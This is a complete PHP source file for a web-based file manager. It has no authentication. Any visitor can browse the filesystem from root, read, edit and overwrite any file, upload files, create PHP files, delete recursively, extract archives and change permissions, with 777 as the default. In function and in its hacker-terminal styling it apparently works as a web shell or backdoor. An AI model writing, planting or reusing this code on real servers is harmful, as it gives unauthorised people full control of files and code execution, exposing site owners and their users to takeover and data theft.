<?php
session_start();
ob_start();

// ====================== CONFIGURATION ======================
$TITLE = "PHP File Manager";
// ===========================================================

$currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath(__DIR__);
if ($currentDir === false || !is_dir($currentDir)) {
    $currentDir = realpath(__DIR__);
}

function custom_copy($src, $dst) {
    if (is_dir($src)) {
        if (!is_dir($dst)) mkdir($dst, 0755, true);
        $files = scandir($src);
        foreach ($files as $file) {
            if ($file != "." && $file != "..") custom_copy("$src/$file", "$dst/$file");
        }
    } else if (file_exists($src)) {
        copy($src, $dst);
    }
}

$action = $_GET['action'] ?? $_POST['action'] ?? '';

switch ($action) {
    case 'upload':
        if (isset($_FILES['files'])) {
            foreach ($_FILES['files']['name'] as $i => $name) {
                if ($_FILES['files']['error'][$i] === 0) {
                    move_uploaded_file($_FILES['files']['tmp_name'][$i], $currentDir . DIRECTORY_SEPARATOR . basename($name));
                }
            }
        }
        break;

    case 'mkdir':
        $folder = $currentDir . DIRECTORY_SEPARATOR . basename($_POST['folder'] ?? 'New-Folder');
        if (!is_dir($folder)) mkdir($folder, 0755, true);
        break;

    case 'mkfile':
        $file = $currentDir . DIRECTORY_SEPARATOR . basename($_POST['filename'] ?? 'newfile.php');
        if (!file_exists($file)) touch($file);
        break;

    case 'delete':
        if (isset($_POST['paths'])) {
            foreach ($_POST['paths'] as $p) {
                $target = realpath($p);
                if ($target && is_file($target)) unlink($target);
                elseif ($target && is_dir($target)) {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
                    foreach ($files as $file) {
                        $file->isDir() ? rmdir($file->getRealPath()) : unlink($file->getRealPath());
                    }
                    rmdir($target);
                }
            }
        }
        break;

    case 'rename':
        $old = realpath($_POST['old'] ?? '');
        $new = $currentDir . DIRECTORY_SEPARATOR . basename($_POST['new'] ?? '');
        if ($old && file_exists($old)) rename($old, $new);
        break;

    case 'chmod':
        if (isset($_POST['paths'], $_POST['perm'])) {
            $perm = octdec($_POST['perm']);
            foreach ($_POST['paths'] as $p) {
                $target = realpath($p);
                if ($target) chmod($target, $perm);
            }
        }
        break;

    case 'copy_files':
        if (isset($_POST['paths'])) $_SESSION['copied_files'] = $_POST['paths'];
        break;

    case 'paste_files':
        if (!empty($_SESSION['copied_files'])) {
            foreach ($_SESSION['copied_files'] as $src) {
                $src = realpath($src);
                if ($src && file_exists($src)) {
                    $dst = $currentDir . DIRECTORY_SEPARATOR . basename($src);
                    custom_copy($src, $dst);
                }
            }
            unset($_SESSION['copied_files']);
        }
        break;

    case 'cancel_copy':
        unset($_SESSION['copied_files']);
        break;

    case 'zip':
        if (isset($_POST['paths'])) {
            $zipName = 'archive_' . date('YmdHis') . '.zip';
            $zipPath = $currentDir . DIRECTORY_SEPARATOR . $zipName;
            $zip = new ZipArchive();
            if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                foreach ($_POST['paths'] as $p) {
                    $filePath = realpath($p);
                    if ($filePath && is_file($filePath)) $zip->addFile($filePath, basename($filePath));
                    elseif ($filePath && is_dir($filePath)) {
                        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($filePath, RecursiveDirectoryIterator::SKIP_DOTS));
                        foreach ($iterator as $file) {
                            if (!$file->isDir()) {
                                $zip->addFile($file->getPathname(), str_replace($currentDir . DIRECTORY_SEPARATOR, '', $file->getPathname()));
                            }
                        }
                    }
                }
                $zip->close();
            }
        }
        break;

    case 'unzip':
        $file = realpath($_GET['file'] ?? '');
        if ($file && is_file($file) && pathinfo($file, PATHINFO_EXTENSION) === 'zip') {
            $zip = new ZipArchive();
            if ($zip->open($file) === TRUE) {
                $zip->extractTo($currentDir);
                $zip->close();
            }
        }
        break;

    case 'download':
        $file = realpath($_GET['file'] ?? '');
        if ($file && is_file($file)) {
            while(ob_get_level()) ob_end_clean();
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        }
        break;

    case 'edit':
        $file = realpath($_GET['file'] ?? $_POST['file'] ?? '');
        if ($file && isset($_POST['content'])) {
            echo (file_put_contents($file, $_POST['content']) !== false) ? "SUCCESS" : "ERROR: Permission denied";
            exit;
        }
        if ($file && isset($_GET['load'])) {
            while(ob_get_level()) ob_end_clean();
            echo htmlspecialchars(file_get_contents($file)); // Fixed encoding issue
            exit;
        }
        break;
}

// Get and Sort Items
$items = [];
$scan = @scandir($currentDir);
if ($scan) {
    foreach ($scan as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullpath = $currentDir . DIRECTORY_SEPARATOR . $item;
        $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
        
        $items[] = [
            'name' => $item,
            'is_dir' => is_dir($fullpath),
            'size' => is_file($fullpath) ? filesize($fullpath) : 0,
            'date' => date('Y-m-d H:i', filemtime($fullpath)),
            'path' => $fullpath,
            'perm' => substr(sprintf('%o', fileperms($fullpath)), -4),
            'ext'  => $ext,
            'is_php' => $ext === 'php',
            'is_editable' => in_array($ext, ['php','js','css','html','txt','json','xml'])
        ];
    }
}

usort($items, function($a, $b) {
    if ($a['is_dir'] && !$b['is_dir']) return -1;
    if (!$a['is_dir'] && $b['is_dir']) return 1;
    if ($a['is_php'] && !$b['is_php']) return -1;
    if (!$a['is_php'] && $b['is_php']) return 1;
    return strcasecmp($a['name'], $b['name']);
});
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $TITLE ?></title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/monokai.min.css">
    <style>
        body { background: #f8f9fa; color: #333; }
        .terminal-path-container { margin-bottom: 15px; }
        .terminal-home-link { color: #006600; font-weight: bold; font-family: monospace; }
        .terminal-home-link:hover { color: #00aa00; }
        .terminal-path-box { 
            background-color: #000; 
            color: #00ff00; 
            padding: 10px; 
            border: 1px solid #00ff00; 
            font-family: monospace; 
            font-size: 15px; 
        }
        .custom-toolbar { 
            background: #051405; 
            border: 1px solid #00ff00; 
            padding: 10px; 
            display: flex; 
            flex-wrap: wrap; 
            gap: 8px; 
            align-items: center; 
            margin-bottom: 15px;
        }
        .table { background: #ffffff; }
        .table thead { background: #333; color: white; }
        .folder-name { color: #000000 !important; font-weight: 500; }
        .folder-name:hover { color: #ff0000 !important; }
        .php-file { color: #0066cc; font-weight: bold; }

        /* Improved Editor Styling */
        .CodeMirror {
            height: 620px;
            font-size: 15px;
            line-height: 1.6;
            font-family: 'Courier New', monospace;
        }
        .CodeMirror-gutters {
            background: #2e2e2e;
        }
    </style>
</head>
<body>
<div class="container-fluid mt-3">

    <!-- Path Navigation -->
    <div class="terminal-path-container">
        <a href="?dir=<?= urlencode(realpath(__DIR__)) ?>" class="terminal-home-link">HOME</a>
        <div class="terminal-path-box">
            <strong>PATH:</strong> 
            <a href="?dir=/">/</a> 
            <?php
            $parts = explode(DIRECTORY_SEPARATOR, $currentDir);
            $accum = '';
            foreach ($parts as $part) {
                if ($part === '') continue;
                $accum .= (substr($accum, -1) === DIRECTORY_SEPARATOR ? '' : DIRECTORY_SEPARATOR) . $part;
                echo ' / <a href="?dir=' . urlencode($accum) . '">' . htmlspecialchars($part) . '</a>';
            }
            ?>
        </div>
    </div>

    <?php if (!empty($_SESSION['copied_files'])): ?>
    <div class="alert alert-success">
        <strong><?= count($_SESSION['copied_files']) ?> item(s)</strong> copied. Navigate to destination folder and click "Paste Here".
        <button class="btn btn-success btn-sm ms-3" onclick="submitForm('paste_files')">📋 Paste Here</button>
        <button class="btn btn-outline-danger btn-sm" onclick="submitForm('cancel_copy')">Cancel</button>
    </div>
    <?php endif; ?>

    <!-- Toolbar -->
    <div class="custom-toolbar">
        <input type="text" id="uiNewFolder" placeholder="New Folder Name" style="width: 160px;">
        <button onclick="createFolder()">+ New Folder</button>

        <input type="text" id="uiNewFile" placeholder="New File (e.g. test.php)" style="width: 170px;">
        <button onclick="createFile()">+ New File</button>

        <form action="?dir=<?= urlencode($currentDir) ?>" method="post" enctype="multipart/form-data" class="d-flex align-items-center m-0" style="gap:5px;">
            <input type="hidden" name="action" value="upload">
            <input type="file" name="files[]" multiple>
            <button type="submit">📤 Upload (Multiple Allowed)</button>
        </form>

        <button onclick="toggleAllChecked()">Select All</button>
        <button onclick="copySelected()">📋 Copy Selected</button>
        <button onclick="bulkDelete()">🗑 Delete Selected</button>
        
        <input type="text" id="uiChmod" value="777" style="width: 55px; text-align:center;">
        <button onclick="bulkChmod()">🔧 Chmod Selected</button>
        <button onclick="zipSelected()">📦 Zip Selected</button>
    </div>

    <!-- File Table -->
    <div class="table-responsive">
        <table class="table table-hover align-middle">
            <thead>
                <tr>
                    <th width="30"><input type="checkbox" id="mainCheckbox" onclick="toggleAllChecked()"></th>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Permissions</th>
                    <th>Modified</th>
                    <th width="220">Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php if ($currentDir !== DIRECTORY_SEPARATOR && dirname($currentDir) !== $currentDir): ?>
                <tr>
                    <td></td>
                    <td colspan="5">
                        <i class="bi bi-arrow-return-left"></i>
                        <a href="?dir=<?= urlencode(dirname($currentDir)) ?>"><strong>..</strong> (Parent Directory)</a>
                    </td>
                </tr>
                <?php endif; ?>

                <?php foreach ($items as $item): ?>
                <tr>
                    <td><input type="checkbox" class="item-checkbox" value="<?= htmlspecialchars($item['path']) ?>"></td>
                    <td>
                        <?php if ($item['is_dir']): ?>
                            <i class="bi bi-folder-fill text-warning"></i>
                            <a href="?dir=<?= urlencode($item['path']) ?>" class="folder-name text-decoration-none">
                                <?= htmlspecialchars($item['name']) ?>
                            </a>
                        <?php elseif ($item['is_editable']): ?>
                            <i class="bi <?= $item['is_php'] ? 'bi-filetype-php php-file' : 'bi-file-earmark-text' ?>"></i>
                            <a onclick="editFile('<?= htmlspecialchars(addslashes($item['path'])) ?>')" class="editable-file text-decoration-none">
                                <?= htmlspecialchars($item['name']) ?>
                            </a>
                        <?php else: ?>
                            <i class="bi bi-file-earmark"></i>
                            <?= htmlspecialchars($item['name']) ?>
                        <?php endif; ?>
                    </td>
                    <td><?= $item['is_dir'] ? '-' : round($item['size']/1024, 2) . ' KB' ?></td>
                    <td><code><?= $item['perm'] ?></code></td>
                    <td><?= $item['date'] ?></td>
                    <td>
                        <?php if (!$item['is_dir'] && $item['is_editable']): ?>
                            <button onclick="editFile('<?= htmlspecialchars(addslashes($item['path'])) ?>')" class="btn btn-sm btn-outline-info"><i class="bi bi-pencil"></i></button>
                        <?php endif; ?>
                        <?php if (!$item['is_dir']): ?>
                            <a href="?dir=<?= urlencode($currentDir) ?>&action=download&file=<?= urlencode($item['path']) ?>" class="btn btn-sm btn-outline-primary"><i class="bi bi-download"></i></a>
                        <?php endif; ?>
                        <button onclick="renameItem('<?= htmlspecialchars(addslashes($item['path'])) ?>','<?= htmlspecialchars(addslashes($item['name'])) ?>')" class="btn btn-sm btn-outline-warning"><i class="bi bi-pencil-square"></i></button>
                        <button onclick="chmodItem('<?= htmlspecialchars(addslashes($item['path'])) ?>','<?= $item['perm'] ?>')" class="btn btn-sm btn-outline-secondary"><i class="bi bi-gear"></i></button>
                        <button onclick="deleteItem('<?= htmlspecialchars(addslashes($item['path'])) ?>')" class="btn btn-sm btn-outline-danger"><i class="bi bi-trash"></i></button>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>

<!-- Improved Editor Modal -->
<div class="modal fade" id="editorModal" tabindex="-1" data-bs-backdrop="static">
    <div class="modal-dialog modal-xl">
        <div class="modal-content">
            <div class="modal-header bg-dark text-white">
                <h5>Editing: <span id="editingFile" class="text-info"></span></h5>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
            </div>
            <form id="editForm">
                <div class="modal-body p-0">
                    <input type="hidden" name="action" value="edit">
                    <input type="hidden" name="file" id="editFilePath">
                    <textarea id="codeEditor" name="content"></textarea>
                </div>
                <div class="modal-footer">
                    <span id="saveStatus" class="fw-bold text-success"></span>
                    <div>
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                        <button type="submit" class="btn btn-primary" id="saveBtn">Save File (Ctrl + S)</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/php/php.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/javascript/javascript.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/css/css.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/xml/xml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/htmlmixed/htmlmixed.min.js"></script>

<script>
let editor;

function initEditor() {
    if (!editor) {
        editor = CodeMirror.fromTextArea(document.getElementById("codeEditor"), {
            lineNumbers: true,
            mode: "application/x-httpd-php",
            theme: "monokai",
            matchBrackets: true,
            styleActiveLine: true,
            indentUnit: 4,
            indentWithTabs: false,
            lineWrapping: true,
            extraKeys: {
                "Ctrl-S": function() { document.getElementById('saveBtn').click(); },
                "Cmd-S": function() { document.getElementById('saveBtn').click(); }
            }
        });
    }
    editor.setOption("theme", "monokai"); // Force Monokai theme
}

function editFile(path) {
    const filename = path.split(/[\/\\]/).pop();
    document.getElementById('editingFile').textContent = filename;
    document.getElementById('editFilePath').value = path;
    document.getElementById('saveStatus').textContent = "";

    initEditor();
    
    // Auto detect mode
    let mode = "application/x-httpd-php";
    if (filename.endsWith('.js')) mode = "javascript";
    if (filename.endsWith('.css')) mode = "css";
    if (filename.endsWith('.html')) mode = "htmlmixed";
    editor.setOption("mode", mode);

    editor.setValue("Loading file content...");

    const modal = new bootstrap.Modal(document.getElementById('editorModal'));
    modal.show();

    fetch('?action=edit&load=1&file=' + encodeURIComponent(path))
        .then(r => r.text())
        .then(content => {
            editor.setValue(content);
            setTimeout(() => {
                editor.refresh();
                editor.focus();
            }, 400);
        });
}

// Save with AJAX
document.getElementById('editForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const btn = document.getElementById('saveBtn');
    const status = document.getElementById('saveStatus');
    
    btn.disabled = true;
    btn.textContent = "Saving...";
    status.textContent = "";

    editor.save();

    fetch('?dir=<?= urlencode($currentDir) ?>', {
        method: 'POST',
        body: new FormData(this)
    })
    .then(res => res.text())
    .then(text => {
        if (text.trim() === "SUCCESS") {
            status.textContent = "✔ File saved successfully!";
        } else {
            status.classList.add("text-danger");
            status.textContent = "✖ Failed to save file!";
        }
        btn.disabled = false;
        btn.textContent = "Save File (Ctrl + S)";
        setTimeout(() => { status.textContent = ""; status.classList.remove("text-danger"); }, 5000);
    });
});

// Other functions (same as before)
function getSelected() { return Array.from(document.querySelectorAll('.item-checkbox:checked')).map(chk => chk.value); }

function submitForm(action, dataObj = {}) {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = '?dir=<?= urlencode($currentDir) ?>';
    form.innerHTML = `<input type="hidden" name="action" value="${action}">`;
    for (const key in dataObj) {
        if (Array.isArray(dataObj[key])) {
            dataObj[key].forEach(val => form.innerHTML += `<input type="hidden" name="${key}[]" value="${val}">`);
        } else {
            form.innerHTML += `<input type="hidden" name="${key}" value="${dataObj[key]}">`;
        }
    }
    document.body.appendChild(form);
    form.submit();
}

function toggleAllChecked() {
    const main = document.getElementById('mainCheckbox');
    main.checked = !main.checked;
    document.querySelectorAll('.item-checkbox').forEach(chk => chk.checked = main.checked);
}

function createFolder() {
    const name = document.getElementById('uiNewFolder').value.trim();
    if (!name) return alert("Please enter folder name");
    submitForm('mkdir', { folder: name });
}

function createFile() {
    const name = document.getElementById('uiNewFile').value.trim();
    if (!name) return alert("Please enter file name");
    submitForm('mkfile', { filename: name });
}

function copySelected() {
    const selected = getSelected();
    if (selected.length === 0) return alert("Please select at least one item");
    submitForm('copy_files', { paths: selected });
}

function bulkDelete() {
    const selected = getSelected();
    if (selected.length === 0) return alert("No items selected");
    if (confirm(`Delete ${selected.length} selected item(s)?`)) submitForm('delete', { paths: selected });
}

function bulkChmod() {
    const selected = getSelected();
    if (selected.length === 0) return alert("No items selected");
    const perm = document.getElementById('uiChmod').value;
    submitForm('chmod', { paths: selected, perm: perm });
}

function zipSelected() {
    const selected = getSelected();
    if (selected.length === 0) return alert("No items selected");
    submitForm('zip', { paths: selected });
}

function deleteItem(path) {
    if (confirm("Delete this item?")) submitForm('delete', { paths: [path] });
}

function renameItem(oldPath, oldName) {
    const newName = prompt("Rename to:", oldName);
    if (newName && newName !== oldName) submitForm('rename', { old: oldPath, new: newName });
}

function chmodItem(path, current) {
    const perm = prompt("Enter permission (e.g. 755):", current);
    if (perm) submitForm('chmod', { paths: [path], perm: perm });
}
</script>
</body>
</html>